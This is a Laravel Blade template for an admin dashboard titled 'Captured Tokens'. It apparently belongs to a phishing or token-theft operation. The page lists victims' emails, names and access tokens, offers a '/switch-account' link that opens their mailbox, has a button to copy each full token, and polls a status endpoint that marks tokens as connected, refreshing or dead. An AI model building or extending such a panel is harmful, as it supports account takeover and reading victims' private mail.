@php use Illuminate\Support\Str; @endphp
@extends('layouts.admin')

@section('content')

<style>
    .token-status {
    transition: all 0.3s ease;
}
.status-refreshing {
    animation: blink 1s infinite;
}

@keyframes blink {
    0% { opacity: 1; }
    50% { opacity: 0.3; }
    100% { opacity: 1; }
}
/* ===== CONTAINER ===== */
.token-container {
    margin-top: 20px;
}

/* ===== CARD ===== */
.token-card {
    background: #0d0d0d;
    border: 1px solid #00ff9955;
    border-radius: 10px;
    padding: 20px;
    box-shadow: 0 0 20px #00ff9922;
}

/* ===== TITLE ===== */
.token-title {
    color: #00ffcc;
    font-size: 22px;
    font-weight: bold;
    margin-bottom: 20px;
}

/* ===== TABLE ===== */
.token-table {
    width: 100%;
    border-collapse: collapse;
}

.token-table th {
    text-align: left;
    padding: 14px;
    border-bottom: 1px solid #00ff9955;
    color: #00ffaa;
    font-size: 14px;
}

.token-table td {
    padding: 16px 14px;
    border-bottom: 1px solid #00ff9922;
    vertical-align: middle;
}

/* ===== ROW HOVER ===== */
.token-table tr:hover {
    background: #00ff9911;
}

/* ===== EMAIL ===== */
.email {
    color: #00eaff;
    font-weight: 600;
}

/* ===== NAME ===== */
.name {
    color: #ffffff;
    font-size: 14px;
}

/* ===== TOKEN BOX ===== */
.token-box {
    background: #000;
    border: 1px solid #00ff9955;
    padding: 8px 10px;
    border-radius: 6px;
    font-size: 12px;
    color: #00ffcc;
    font-family: monospace;
}

/* ===== STATUS ===== */
.status-active {
    color: #00ff88;
    font-weight: bold;
}

.status-expired {
    color: #ff4444;
    font-weight: bold;
}

/* ===== BUTTONS ===== */
.btn-icon {
    border: none;
    padding: 8px 10px;
    border-radius: 6px;
    margin-right: 5px;
    cursor: pointer;
}

.btn-mail {
    background: #00ffaa;
    color: #000;
}

.btn-delete {
    background: #ff3b3b;
    color: #fff;
}

.btn-copy {
    background: #222;
    color: #00ffcc;
}

/* ===== SPACING FIX ===== */
.action-group {
    display: flex;
    gap: 6px;
}

</style>

<div class="container-fluid token-container">

    <div class="token-card">

        <div class="token-title">📡 Captured Tokens</div>

        <table class="token-table">

            <thead>
                <tr>
                    <th>#</th>
                    <th>User</th>
                    <th>Access Token</th>
                    <th>Status</th>
                    <th>Action</th>
                </tr>
            </thead>

            <tbody>
                @foreach($tokens as $token)

                @php
                    $isExpired = \Carbon\Carbon::parse($token->expires_at)->isPast();
                @endphp

                <tr>

                    <!-- ID -->
                    <td>#{{ $loop->iteration }}</td>

                    <!-- USER -->
                    <td>
                        <div class="email">{{ $token->email }}</div>
                        
                        <div class="name">{{ $token->name }}<br>
    <small style="color:#888;">
        Exp: {{ \Carbon\Carbon::parse($token->expires_at)->diffForHumans() }}
    </small></div>
                    </td>

                    <!-- TOKEN -->
                    <td>
    <span 
        class="token-status"
        data-id="{{ $token->id }}"
    >
        @if($token->status === 'dead')
            <span style="color:#ff4444;">Dead</span>
        @elseif(\Carbon\Carbon::parse($token->expires_at)->isPast())
            <span class="status-refreshing" style="color:#ffaa00;">Refreshing...</span>
        @else
            <span style="color:#00ff88;">Connected</span>
        @endif
    </span>
</td>

                    <!-- STATUS -->
                    <td>
          @if($token->status === 'dead')
    <span style="color:#ff4444;">Dead</span>
@elseif(\Carbon\Carbon::parse($token->expires_at)->isPast())
    <span class="status-refreshing" style="color:#ffaa00;">Refreshing...</span>
@else
    <span style="color:#00ff88;">Connected</span>
@endif
                    </td>

                    <!-- ACTION -->
                    <td>
                        <div class="action-group">

                            <!-- OPEN MAIL -->
                           @if($token->status !== 'dead')
<a href="/switch-account/{{ $token->id }}" target="_blank">
    <button class="btn-icon btn-mail">📧</button>
</a>
@else
<button class="btn-icon btn-mail" style="opacity:0.3;cursor:not-allowed;">
    📧
</button>
@endif

                            <!-- COPY TOKEN -->
                            <button class="btn-icon btn-copy"
    title="Copy full token"
    onclick="copyToken('{{ $token->access_token }}')">
    📋
</button>
                            <!-- DELETE -->
                            <form action="/tokens/{{ $token->id }}" method="POST">
                                @csrf
                                @method('DELETE')

                                <button class="btn-icon btn-delete"
                                    onclick="return confirm('Delete this token?')">
                                    🗑
                                </button>
                            </form>

                        </div>
                    </td>

                </tr>

                @endforeach
            </tbody>

        </table>

    </div>

</div>

<script>

const refreshing = document.querySelectorAll('.status-refreshing').length > 0;

function copyToken(token){
    navigator.clipboard.writeText(token);

    const msg = document.createElement('div');
    msg.innerText = "Copied!";
    msg.style.position = "fixed";
    msg.style.bottom = "20px";
    msg.style.right = "20px";
    msg.style.background = "#00ff95";
    msg.style.color = "#000";
    msg.style.padding = "10px 15px";
    msg.style.borderRadius = "6px";
    msg.style.boxShadow = "0 0 10px #00ff95";
    document.body.appendChild(msg);

    setTimeout(() => msg.remove(), 1500);
}
</script>

<script>
async function fetchTokenStatus() {
    try {
        const res = await fetch('/tokens/status');
        const data = await res.json();

        data.forEach(token => {

            const el = document.querySelector(`.token-status[data-id='${token.id}']`);
            if (!el) return;

            const expired = new Date(token.expires_at) < new Date();

            let html = '';

           if (token.status === 'dead') {
    html = `<span style="color:#ff4444;">Dead</span>`;
}
else if (token.status === 'refreshing') {
    html = `<span class="status-refreshing" style="color:#ffaa00;">Refreshing...</span>`;
}
else {
    html = `<span style="color:#00ff88;">Connected</span>`;
}

            el.innerHTML = html;
        });

    } catch (e) {
        console.error("Fetch error", e);
    }
}

// polling tiap 5 detik
setInterval(fetchTokenStatus, 5000);

// run pertama kali
fetchTokenStatus();
</script>

@endsection